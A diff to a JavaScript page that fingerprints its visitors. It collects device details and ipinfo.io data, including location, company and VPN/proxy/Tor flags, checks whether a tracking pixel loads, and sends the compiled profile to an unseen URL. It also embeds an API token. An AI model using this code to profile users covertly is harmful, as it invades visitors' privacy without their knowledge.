@@ -93,10 +93,26 @@
         try {
             const response = await fetch('https://ipinfo.io/?token=46123289608cfd');
             const data = await response.json();
-            let ipInfoFormatted = "";
-            for (const [key, value] of Object.entries(data)) {
-                ipInfoFormatted += `${key}: ${value}\n\n`;
-            }
+            const ipInfoFormatted = `
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country}
+Location: ${data.loc}
+Postal: ${data.postal}
+Timezone: ${data.timezone}
+
+Company Name: ${data.company.name}
+Company Domain: ${data.company.domain}
+Company Type: ${data.company.type}
+
+VPN: ${data.privacy.vpn}
+Proxy: ${data.privacy.proxy}
+Tor: ${data.privacy.tor}
+Relay: ${data.privacy.relay}
+Hosting: ${data.privacy.hosting}
+Service: ${data.privacy.service}
+            `;
             return ipInfoFormatted;
         } catch (error) {
             console.error('Error fetching IP info:', error);
@@ -193,46 +209,24 @@
         output += `Microphones Detected: ${mediaDevices.microphonesCount}\n\n`;
         output += `Cameras Detected: ${mediaDevices.cameraCount}\n\n`;
 
-        output += `Firefox Extensions Supported: ${navigator.userAgent.includes("Firefox") ? "Yes" : "No"}\n\n`;
+        output += `Mouse Detected: ${detectMouse()}\n\n`;
 
-        output += `Memory (RAM): ${navigator.deviceMemory || "Unknown"} GB\n\n`;
-
-        output += `Number of cores in CPU: ${navigator.hardwareConcurrency || "Unknown"}\n\n`;
-
-        try {
-            const clipboardAccess = await navigator.permissions.query({ name: 'clipboard-read' });
-            output += `Clipboard Access: ${clipboardAccess.state === "granted" ? "Allowed" : "Disabled"}\n\n`;
-        } catch (e) {
-            output += `Clipboard Access: Disabled\n\n`;
-        }
-
-        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        output += `Time Zone: UTC ${timeZone}\n\n`;
+        const ipInfo = await fetchIPInfo();
+        output += `${ipInfo}\n\n`;
 
         output += `Internet Connection: ${getConnectionType()}\n\n`;
 
-        output += `Mouse detected: ${detectMouse()}\n\n`;
+        const pixelStatus = await new Promise((resolve) => {
+            const img = new Image();
+            img.onload = () => resolve("Google Analytics Tracker Loaded: Yes");
+            img.onerror = () => resolve("Google Analytics Tracker Loaded: No");
+            img.src = "https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000000-2&cid=555&ec=category&ea=action&el=label&ev=1";
+        });
+        output += `${pixelStatus}\n\n`;
 
-        const pixelStatus = await checkGoogleAnalyticsPixel();
-        output += `G Analytics Tracker Loaded: ${pixelStatus}\n\n`;
-
-        const ipInfo = await fetchIPInfo();
-        output += `IP Information:\n${ipInfo}`;
+        infoDiv.innerText = output;
 
         await sendMessageToURL(output);
-
-        infoDiv.innerHTML = output;
-    }
-
-    async function checkGoogleAnalyticsPixel() {
-        try {
-            const img = new Image();
-            img.src = "https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000000-2&cid=555&ec=category&ea=action&el=label&ev=1";
-            await img.decode();
-            return "Yes";
-        } catch (e) {
-            return "No";
-        }
     }
 
     displayDeviceInfo();
